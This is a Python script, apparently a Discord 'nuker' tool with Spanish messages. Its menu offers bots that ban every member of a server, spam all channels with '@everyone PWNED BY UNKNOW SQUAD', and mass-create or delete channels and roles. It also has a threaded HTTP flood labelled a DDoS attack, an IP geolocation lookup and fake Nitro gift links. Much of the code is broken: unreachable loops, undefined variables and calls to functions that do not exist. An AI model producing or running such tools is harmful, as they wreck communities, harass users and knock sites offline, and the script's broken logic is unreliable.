try:
    import discord
    from discord.ext import commands
    import colorama
    from colorama import Fore
    import pystyle
    import random
    import os
    import time
    import requests
    import threading
    import asyncio
    from datetime import datetime


except ModuleNotFoundError:
    os.system("pip intall discord")
    os.system("pip install colorama")
    os.system("pip install pystyle")
    os.system("pip install requests")



os.system("cls")


art = f""" {Fore.BLUE}
                                                                                               
     _____    _____      _____  _________________       _____            _____     ____        
 ___|\    \  |\    \    /    /|/                 \ ____|\    \      ____|\    \   |    |       
|    |\    \ | \    \  /    / |\______     ______//     /\    \    /     /\    \  |    |       
|    | |    ||  \____\/    /  /   \( /    /  )/  /     /  \    \  /     /  \    \ |    |       
|    |/____/| \ |    /    /  /     ' |   |   '  |     |    |    ||     |    |    ||    |  ____ 
|    ||    ||  \|___/    /  /        |   |      |     |    |    ||     |    |    ||    | |    |
|    ||____|/      /    /  /        /   //      |\     \  /    /||\     \  /    /||    | |    |
|____|            /____/  /        /___//       | \_____\/____/ || \_____\/____/ ||____|/____/|
|    |           |`    | /        |`   |         \ |    ||    | / \ |    ||    | /|    |     ||
|____|           |_____|/         |____|          \|____||____|/   \|____||____|/ |____|_____|/
  \(                )/              \(               \(    )/         \(    )/      \(    )/   
   '                '                '                '    '           '    '        '    '    
                                                                                               
"""








print(art)
print("\n================================")
print(f"{Fore.RED} 1- Ban All")
print(f"{Fore.RED} 2- Fast Spam")
print(f"{Fore.RED} 3- Ip Information")
print(f"{Fore.RED} 4- DDoS attack")
print(f"{Fore.RED} 5- Fastest Channel creator")
print(f"{Fore.RED} 6- Fastest Channel Deleter")
print(f"{Fore.RED} 7- Role Deleter")
print(f"{Fore.RED} 8- Role Creator")
print(f"{Fore.RED} 9- Token information")
print(f"{Fore.RED} 10- Fake Nitro")
print(f"{Fore.RED} 99- Nuke server menu")
print(f"{Fore.RED} 0- Exit")
print(f"{Fore.CYAN}\n================================")


opc = input("$>>")


if opc == '':
     exit()


if opc == '1':
    os.system("cls")

    token1 = input("Discord bot token: ")
    prefix2 = input("Prefix")


    bot = commands.Bot(command_prefix=prefix2, intents=discord.Intents.all())


    @bot.event
    async def on_ready():
        print(f"{Fore.GREEN} Bot online!")
        print("Run !Ban")


        @bot.command(name="ban")
        async def ban(ctx):
            await ctx.message.delete()
            for member in ctx.guild.members:
                try:
                    await member.ban()

                except Exception as e:
                    print(f"Error {e}")

    

    bot.run(token1)





if opc == '2':
    TOKEN = input('Token: ')
    prefix6 = input("Prefix: ")  
    

    bot = commands.Bot(command_prefix=prefix6, intents=discord.Intents.all())

    cooldowns = {}

    @bot.command(name="mass_message")
    async def mass_message(ctx, args=None):
        message = ctx.message

        if message.author.id in cooldowns:
            cooldown_expiration = cooldowns[message.author.id]
            remaining_cooldown = (cooldown_expiration - datetime.now().timestamp()) / 1000

            await message.author.send(f"Wait {remaining_cooldown:.1f} ")
            return

        cooldown_time = 300
        cooldowns[message.author.id] = datetime.now().timestamp() + cooldown_time

        await message.delete()

        async def spam_channel(channel):
            messages = ["""@everyone **PWNED BY UNKNOW SQUAD BRO**
                            Vete de esta mierda
                            leave leave """] * 20
            await asyncio.gather(*[channel.send(msg) for msg in messages])

        await asyncio.gather(*[spam_channel(channel) for channel in message.guild.channels if channel.type == discord.ChannelType.text])

        print("Todos los canales han sido exitosamente spammeados.")

    @bot.event
    async def on_ready():
        print(f'¡Conectado como {bot.user}!')

    bot.run(TOKEN)




if opc == '3':
    ip = input("IP: ")
    api = f"https://ipinfo.io/{ip}"

    


    response = requests.get(api)

    if response.status_code == 200:
            data = response.json()
            print("Información de la IP:")
            print("IP:", data.get('ip'))
            print("Hostname:", data.get('hostname'))
            print("Ciudad:", data.get('city'))
            print("Región:", data.get('region'))
            print("País:", data.get('country'))
            print("Proveedor de servicio de Internet (ISP):", data.get('org'))
            print("Latitud, Longitud:", data.get('loc'))



if opc == '4':
    


    def dos(target):
        while True:
            try:
                res = requests.get(target)
                print("Request sent!")
            except requests.exceptions.ConnectionError:
                print(" (-) FAILDED")
    
        threads = 20    
        url = input("URL>>")
        try:
            
            threads = int(input("Threads: "))
        except ValueError:
                exit("Cantidad de theards no valida!")


        for _ in range(0, threads):
            thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        print(str(i + 1) + " DOS ATTACK STARTED")


if opc == '5':
    token3 = input("Token: ")
    prefix4 = input("Prefix: ")
    name = input("Channels Name: ")

    bot = commands.Bot(command_prefix=prefix4, intents=discord.Intents.all()) 

    @bot.event
    async def on_ready():
        print(f"{Fore.GREEN} Bot online!")
        print("Run !channel")

    @bot.command(name="channel")
    async def channel(ctx):
        await ctx.message.delete()
        for _ in range(40):
            delay = 0.1
            await ctx.guild.create_text_channel(name)
            await asyncio.sleep(delay)
            print("Canal Creado!")

    bot.run(token3)



if opc == '6':
    token4 = input("Token: ")
    prefix5 = input("Prefix: ")
        
    bot = commands.Bot(command_prefix=prefix5, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
            print(f"{Fore.GREEN} Bot online!")
            print("Run !delete")


    @bot.command(name="delete")
    async def delete(ctx):
            delay = 0.2
            await ctx.message.delete()
            for channel in ctx.guild.channels:
                await channel.delete()
                await asyncio.sleep(delay / 200)
                print("Canal Borrado!")

    bot.run(token4)



if opc == '7':
     token5 = input("Token: ")
     prefix7 = input("Prefix: ")

     bot = commands.Bot(command_prefix=prefix7, intents=discord.Intents.all())

     @bot.event
     async def on_ready():
            print(f"{Fore.GREEN} Bot online!")
            print("Run !role")

     @bot.command(name="role")
     async def role(ctx):
            await ctx.message.delete()
            for role in ctx.guild.roles:
                await role.delete()
                print("Rol Borrado!")


if opc == '8':
     token6 = input("Token: ")
     prefix8 = input("Prefix: ")
     roles = input("Role name: ")

     bot = commands.Bot(command_prefix=prefix8, intents=discord.Intents.all())

     @bot.event
     async def on_ready():
            print(f"{Fore.GREEN} Bot online!")
            print("Run !role-create")

     @bot.command(name="role-create")
     async def role_create(ctx):
            await ctx.message.delete()
            await ctx.guild.create_role(name=roles)
            print("Rol Creado!")


if opc == '9':
    token7 = input("Token: ")

    def token(url, token7):
        print("""
        Numero:{phone}

    """.format(phone=url.json().get('phone', 'No phone number found')))

    url = requests.get("https://discord.com/api/v9/users/@me")
    token(url, "token7")

    input("Enter para salir")







if opc == '10':
     print("discord.gift/vhnuzE2YkNCZ7sfYHHKebKXB")
     print("discord.gift/Udzwm3hrQECQBnEEFFCEwdSq")
     




















if opc == '99':
    os.system("cls")
    print(f""" {Fore.GREEN}
 __   __     __  __     __  __     ______        __    __     ______     __   __     __  __    
/\ "-.\ \   /\ \/\ \   /\ \/ /    /\  ___\      /\ "-./  \   /\  ___\   /\ "-.\ \   /\ \/\ \   
\ \ \-.  \  \ \ \_\ \  \ \  _"-.  \ \  __\      \ \ \-./\ \  \ \  __\   \ \ \-.  \  \ \ \_\ \  
 \ \_\\"\_\  \ \_____\  \ \_\ \_\  \ \_____\     \ \_\ \ \_\  \ \_____\  \ \_\\"\_\  \ \_____\ 
  \/_/ \/_/   \/_____/   \/_/\/_/   \/_____/      \/_/  \/_/   \/_____/   \/_/ \/_/   \/_____/ 
                                                                                               
""")
     
print("\n================================")
print(f"{Fore.CYAN}!- Kill")
print("================================")

opc2 = input("$>>")

if opc2 == '!':
        token8 = input("Token: ")
        prefix9 = input("Prefix: ")

        bot = commands.Bot(command_prefix=prefix9, intents=discord.Intents.all())

        @bot.event
        async def on_ready():
                        print(f"{Fore.GREEN} Bot online!")
                        print("Run !nuke")

        @bot.command(name="nuke")
        async def nuke(ctx):
                await ctx.message.delete()
                await delete()
                await channel()
                await mass_message()

        bot.run(token8)


